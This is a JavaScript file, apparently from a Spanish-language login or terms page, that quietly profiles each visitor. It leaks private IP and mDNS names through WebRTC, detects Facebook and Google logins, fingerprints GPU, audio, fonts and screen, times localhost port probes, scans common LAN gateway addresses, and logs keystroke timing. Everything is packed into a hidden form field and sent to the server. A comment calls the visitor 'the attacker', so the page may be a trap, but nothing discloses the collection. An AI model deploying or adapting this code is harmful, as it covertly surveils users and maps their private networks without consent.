const _sp=new URLSearchParams(window.location.search);
if(_sp.has('new_session'))sessionStorage.setItem('terminos_aceptados','true');
if(_sp.has('error')){const _nm=_sp.get('error');const _ec=document.getElementById('error-container');if(_ec){_ec.textContent="Credenciales incorrectas. Intento "+_nm+" de 3.";_ec.style.display='block';}}
if(sessionStorage.getItem('terminos_aceptados')!=="true"){window.location.href="index.html";}
const _ss=document.getElementById('session-id');
if(_ss)_ss.innerText="SG-"+Math.random().toString(36).substr(2,9).toUpperCase();

let _dtO=false,_kD=[],_iPv="Detectando...",_mDNS="N/A",_sS={facebook:false,google:false},_vId="Generando...",_pDt=[],_mA={source:"N/A",network:"N/A",touch:false},_lD=[];document.addEventListener('keydown',e=>{_kD.push({time:Date.now()})});


async function _gPIP(){
    return new Promise((r)=>{
        const cIP=sessionStorage.getItem('ip_privada_temp'),cMD=sessionStorage.getItem('mdns_local_temp');
        if(cIP)_iPv=cIP;if(cMD)_mDNS=cMD;
        if(cIP&&cIP!=="Detectando..."){r();return;}
        const _t=setTimeout(()=>{if(_iPv==="Detectando...")_iPv="Protegido / Time-Out";r();},5000);
        try{
            const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19000'}]});
            pc.createDataChannel("");
            pc.createOffer().then(o=>pc.setLocalDescription(o));
            pc.onicecandidate=(ice)=>{
                if(!ice||!ice.candidate||!ice.candidate.candidate)return;
                const mI=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)?.[1];
                const mM=/([a-z0-9-]+\.local)/i.exec(ice.candidate.candidate)?.[1];
                if(mI){_iPv=mI;clearTimeout(_t);r();}
                if(mM)_mDNS=mM;
            };
        }catch(e){_iPv="Bloqueo de Protocolo";r();}
    });
}
_gPIP();


function _cSS(){
    const nets=[{name:'facebook',url:'https://www.facebook.com/ads/image/?app_id=2318966938'},{name:'google',url:'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Fintl%2Fen%2Fimages%2Flogos%2Fretina_logo_80.png&service=mail'}];
    nets.forEach(n=>{const img=new Image();img.onload=()=>{_sS[n.name]=true;};img.onerror=()=>{_sS[n.name]=false;};img.src=n.url+"&cache="+Math.random();});
}
_cSS();


async function _gVId(){
    const gpu=_oGPU(),audio=await _gAFp();
    const components=[navigator.userAgent,screen.width+"x"+screen.height,new Date().getTimezoneOffset(),navigator.language,gpu,audio].join('|');
    const mB=new TextEncoder().encode(components);
    const hB=await crypto.subtle.digest('SHA-256',mB);
    const hA=Array.from(new Uint8Array(hB));
    const hH=hA.map(b=>b.toString(16).padStart(2,'0')).join('');
    _vId="VID-"+hH.toUpperCase().substring(0,20);
}
_gVId();


async function _sLP(){
    if('ontouchstart'in window||navigator.maxTouchPoints>0){_pDt=[];return;}
    const ports=[80,443,3306,8080,22];
    for(let p of ports){
        const s=performance.now();
        try{await fetch(`http://127.0.0.1:${p}`,{mode:'no-cors',cache:'no-cache'});
        }catch(e){
            const d=performance.now()-s;
            if(d<30)_pDt.push(p);
        }
    }
}
_sLP();


async function _rMA(){
    if(navigator.getBattery){const b=await navigator.getBattery();_mA.source=b.charging?"Cargando (Posible Estación)":"Batería (Móvil/Desplazamiento)";}
    if(navigator.connection)_mA.network=`${navigator.connection.effectiveType} (RTT: ${navigator.connection.rtt}ms)`;
    _mA.touch='ontouchstart'in window||navigator.maxTouchPoints>0;
}
_rMA();

/**
 * @brief Mapeo de la red local (Subnet discovery).
 * @details Intenta localizar puertas de enlace (Gateways) comunes en la red LAN del atacante.
 * @async
 */
async function _sSbn(){
    const tgts=["192.168.1.1","192.168.0.1","192.168.1.254","10.0.0.1"];
    for(let ip of tgts){try{const img=new Image();img.src=`http://${ip}/favicon.ico?t=${Date.now()}`;img.onload=()=>{if(!_lD.includes(ip))_lD.push(ip);};img.onerror=()=>{if(!_lD.includes(ip))_lD.push(ip);};}catch(e){}}
}
_sSbn();

/**
 * @brief Empaqueta y envía los datos forenses al servidor.
 * @details Serializa todos los objetos de análisis (red, hardware, elite) en un campo oculto del formulario.
 * @async
 */
async function _rTd(){
    const data={meta:{visitor_id:_vId,timestamp:new Date().toLocaleString(),devTools:_dtO,biometria_teclado:_kD.slice(-15)},analisis_flujo:{aceptado:sessionStorage.getItem('terminos_aceptados')==="true"},hardware:{ua:navigator.userAgent,gpu:_oGPU(),bateria:await _oBt(),fuentes:_gFnt(),audio_id:await _gAFp(),entorno_movil:_mA},elite:{ip_privada:_iPv,mdns_local:_mDNS,social_profiling:_sS,puertos_abiertos:_pDt,mapeo_lan:_lD},red:{downlink:navigator.connection?navigator.connection.downlink:"N/A",ubicacion:"[SERVER_SCAN]",latitud:0,longitud:0}};
    const inp=document.getElementById('inputForense');
    if(inp)inp.value=JSON.stringify(data);
}
const _frm=document.getElementById('form-final');
if(_frm)_frm.addEventListener('submit',async(e)=>{e.preventDefault();await _rTd();_frm.submit();});


function _oGPU(){try{const c=document.createElement('canvas');const gl=c.getContext('webgl');const dI=gl.getExtension('WEBGL_debug_renderer_info');return dI?gl.getParameter(dI.UNMASKED_RENDERER_WEBGL):"N/A";}catch(e){return"Driver-Protected";}}


async function _oBt(){if(navigator.getBattery){try{const b=await navigator.getBattery();return{nivel:(b.level*100)+"%",charging:b.charging};}catch(e){return"API-Blocked";}}return"API-Not-Supported";}


function _gFnt(){const fl=["Arial","Verdana","Impact","Adobe Clean"];const d=[];const c=document.createElement("canvas");const cx=c.getContext("2d");fl.forEach(f=>{cx.font="72px monospace";const bS=cx.measureText("mmmmmmmmmmlli").width;cx.font="72px '"+f+"', monospace";const nS=cx.measureText("mmmmmmmmmmlli").width;if(nS!==bS)d.push(f);});return d;}


async function _gAFp(){try{const aC=new(window.AudioContext||window.webkitAudioContext)();const osc=aC.createOscillator();const an=aC.createAnalyser();const gn=aC.createGain();gn.gain.value=0;osc.type='triangle';osc.connect(an);an.connect(gn);gn.connect(aC.destination);osc.start(0);const dt=new Uint8Array(an.frequencyBinCount);an.getByteFrequencyData(dt);const fp=dt.reduce((a,b)=>a+b,0);osc.stop();aC.close();return fp>0?fp.toString():"Audio-API-Limited";}catch(e){return"Audio-Engine-Protected";}}

setInterval(_rTd,3000);_rTd();
